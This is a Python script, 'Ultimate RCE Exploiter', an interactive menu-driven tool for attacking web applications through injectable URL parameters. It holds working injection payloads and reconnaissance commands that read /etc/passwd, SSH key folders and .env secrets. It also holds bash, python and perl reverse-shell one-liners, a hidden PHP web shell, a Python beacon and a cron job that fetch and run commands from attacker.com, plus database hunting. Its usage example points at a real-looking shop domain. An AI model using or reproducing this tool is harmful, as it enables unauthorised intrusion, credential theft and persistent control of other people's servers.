#!/usr/bin/env python3

import requests
import sys
import base64
import json
import urllib.parse
import threading
import time
import socket
import os

class UltimateRCE:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('?')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        requests.packages.urllib3.disable_warnings()
        
        self.vuln_params = ['id', 'page', 'file', 'path', 'view', 'load', 'url', 'dir', 'cmd', 'exec']
        self.payloads = {
            'unix': 'echo RCE_TEST_$(whoami)',
            'template': '{{7*7}}',
            'python': "__import__('os').popen('whoami').read()",
            'expression': '${7*7}',
            'command': 'whoami',
        }
    
    def test_vulnerability(self):
        print("\n[*] Testing all parameters...")
        working = {}
        
        for param in self.vuln_params[:3]:
            for ptype, payload in self.payloads.items():
                url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                try:
                    resp = self.session.get(url, timeout=10, verify=False)
                    if resp.status_code == 200:
                        if 'RCE_TEST' in resp.text or 'root' in resp.text or '49' in resp.text:
                            if param not in working:
                                working[param] = []
                            working[param].append(ptype)
                            print(f"[+] {param} - {ptype}: VULNERABLE")
                except:
                    continue
        
        return working
    
    def execute_cmd(self, param, command):
        url = f"{self.target_url}?{param}={urllib.parse.quote(command)}"
        try:
            resp = self.session.get(url, timeout=10, verify=False)
            return self.extract_result(resp.text)
        except:
            return None
    
    def extract_result(self, html):
        import re
        patterns = [r'<div[^>]*>([^<]+)</div>', r'<p[^>]*>([^<]+)</p>', r'>([^<>]{10,500})<']
        for pattern in patterns:
            matches = re.findall(pattern, html, re.DOTALL)
            for match in matches:
                if match and len(match.strip()) > 5:
                    return match.strip()[:500]
        return html[:500]
    
    def system_info(self, param):
        print("\n[*] Gathering system information...")
        
        cmds = {
            "System": "uname -a && cat /etc/os-release",
            "User": "whoami && id",
            "Disk": "df -h",
            "Memory": "free -h",
            "Processes": "ps aux | head -20",
            "Network": "ifconfig || ip addr",
            "Users": "cat /etc/passwd",
            "Cron": "crontab -l",
            "Sudo": "sudo -l",
        }
        
        for desc, cmd in cmds.items():
            result = self.execute_cmd(param, cmd)
            if result:
                print(f"\n[+] {desc}:")
                print(result[:400])
    
    def explore_filesystem(self, param):
        print("\n[*] Exploring filesystem...")
        
        dirs = ["/", "/home", "/var/www", "/tmp", "/etc", "/root"]
        for d in dirs:
            result = self.execute_cmd(param, f"ls -la {d}")
            if result and len(result) > 10:
                print(f"\n[*] {d}:")
                print(result[:300])
    
    def find_sensitive_data(self, param):
        print("\n[*] Searching for sensitive data...")
        
        searches = [
            "find / -name '*.db' -o -name '*.sql' -o -name '*.sqlite*' 2>/dev/null | head -20",
            "find / -name '*.php' -o -name '*.py' -o -name '*.rb' | xargs grep -l 'password\\|secret\\|token\\|api_key' 2>/dev/null | head -10",
            "find / -name '.env' -o -name 'config.yml' -o -name 'database.yml' 2>/dev/null",
            "ls -la /home/*/.ssh/ 2>/dev/null",
            "cat /etc/passwd | grep -v nologin | grep -v false",
        ]
        
        for search in searches:
            result = self.execute_cmd(param, search)
            if result and len(result.strip()) > 5:
                print(f"\n[+] Found:")
                print(result[:500])
    
    def reverse_shell(self, param, lhost, lport="4444"):
        print(f"\n[*] Attempting reverse shell to {lhost}:{lport}")
        
        shells = [
            f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
            f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        ]
        
        print(f"[*] Start listener: nc -lvnp {lport}")
        input("[*] Press Enter after starting listener...")
        
        for shell in shells:
            print(f"[*] Trying shell: {shell[:50]}...")
            self.execute_cmd(param, f"{shell} &")
            time.sleep(3)
    
    def install_backdoor(self, param):
        print("\n[*] Installing persistent backdoor...")
        
        # PHP backdoor
        php_code = """<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>"""
        encoded_php = base64.b64encode(php_code.encode()).decode()
        cmd1 = f"echo '{encoded_php}' | base64 -d > /tmp/.backdoor.php"
        self.execute_cmd(param, cmd1)
        print("[+] PHP backdoor: /tmp/.backdoor.php")
        
        # Python backdoor
        py_code = """#!/usr/bin/python3
import os,time,subprocess
while True:
    try:
        out = subprocess.check_output('wget -qO- http://attacker.com/cmd', shell=True)
        if out: subprocess.run(out.decode(), shell=True)
    except: pass
    time.sleep(60)
"""
        encoded_py = base64.b64encode(py_code.encode()).decode()
        cmd2 = f"echo '{encoded_py}' | base64 -d > /tmp/.systemd && python3 /tmp/.systemd &"
        self.execute_cmd(param, cmd2)
        print("[+] Python backdoor: /tmp/.systemd")
        
        # Cron persistence
        cmd3 = f"(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://attacker.com/cron | bash') | crontab -"
        self.execute_cmd(param, cmd3)
        print("[+] Added to crontab")
    
    def dump_database(self, param):
        print("\n[*] Attempting database dump...")
        
        db_commands = [
            "find / -name '*.db' 2>/dev/null | head -5",
            "find / -name '*.sql' 2>/dev/null | head -5",
            "ps aux | grep -E 'mysql|postgres|mongo'",
            "netstat -tulpn | grep -E '3306|5432|27017'",
        ]
        
        for cmd in db_commands:
            result = self.execute_cmd(param, cmd)
            if result and len(result.strip()) > 5:
                print(f"\n[+] Database info:")
                print(result)
    
    def run_exploit(self):
        print("""
╔══════════════════════════════════════════════════════╗
║               ULTIMATE RCE EXPLOITER                 ║
║          Full System Takeover - Root Confirmed       ║
╚══════════════════════════════════════════════════════╝
        """)
        
        # Test for working parameters
        working = self.test_vulnerability()
        if not working:
            print("[-] No vulnerable parameters found")
            return
        
        param = list(working.keys())[0]
        print(f"\n[+] Using parameter: {param}")
        
        # Main exploit menu
        while True:
            print(f"""
┌─────────────────────────────────────────┐
│   ULTIMATE RCE EXPLOIT MENU             │
├─────────────────────────────────────────┤
│   1. System Information                 │
│   2. Filesystem Exploration             │
│   3. Find Sensitive Data               │
│   4. Reverse Shell                     │
│   5. Install Backdoor                  │
│   6. Database Dump                     │
│   7. Custom Command                    │
│   8. Exit                              │
└─────────────────────────────────────────┘
            """)
            
            choice = input("[?] Select option: ").strip()
            
            if choice == '1':
                self.system_info(param)
            elif choice == '2':
                self.explore_filesystem(param)
            elif choice == '3':
                self.find_sensitive_data(param)
            elif choice == '4':
                lhost = input("[?] LHOST: ").strip()
                lport = input("[?] LPORT (4444): ").strip() or "4444"
                self.reverse_shell(param, lhost, lport)
            elif choice == '5':
                self.install_backdoor(param)
            elif choice == '6':
                self.dump_database(param)
            elif choice == '7':
                cmd = input("[?] Command to execute: ").strip()
                result = self.execute_cmd(param, cmd)
                if result:
                    print(f"\n[+] Result:\n{result}")
            elif choice == '8':
                print("[*] Exiting...")
                break
            else:
                print("[-] Invalid choice")
            
            input("\n[*] Press Enter to continue...")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 rce_exploit.py <target_url>")
        print("Example: python3 rce_exploit.py https://lirat.store/")
        sys.exit(1)
    
    target = sys.argv[1]
    
    print(f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║                    WARNING: CRITICAL RCE                    ║
    ║  Target: {target:<40} ║
    ║  Risk:   FULL SYSTEM COMPROMISE                            ║
    ║  Access: ROOT CONFIRMED                                    ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    confirm = input("[?] Type 'EXPLOIT' to continue: ").strip()
    if confirm != 'EXPLOIT':
        print("[-] Aborted")
        sys.exit(0)
    
    exploiter = UltimateRCE(target)
    
    try:
        exploiter.run_exploit()
    except KeyboardInterrupt:
        print("\n[*] Exploit interrupted")
    except Exception as e:
        print(f"\n[-] Error: {e}")

if __name__ == "__main__":
    main()